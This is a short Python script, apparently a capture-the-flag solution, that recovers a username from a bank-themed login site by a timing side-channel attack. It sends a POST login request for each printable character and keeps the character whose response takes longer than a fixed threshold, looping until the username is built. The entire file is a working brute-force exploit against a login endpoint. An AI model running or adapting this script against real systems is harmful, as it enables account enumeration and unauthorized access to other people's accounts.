import requests
from time import time
from tqdm import tqdm
import string
CHARSET = string.printable[:95]
SITE = "https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app/"


def get_data(username, password):
    start_time = time()
    data = {"username": username, "password": password}
    r = requests.post(SITE, data=data)
    return r, time() - start_time


THRESH = 0.8
username = ''
# times, resp = [], []
while True:
    for c in CHARSET:
        res, duration = get_data(username+c, c)
        print(c, round(duration, 5), len(res.text))
        if duration > THRESH:
            username += c
            break
    print("*"*10, username)
        # times.append(duration)
        # resp.append(res)
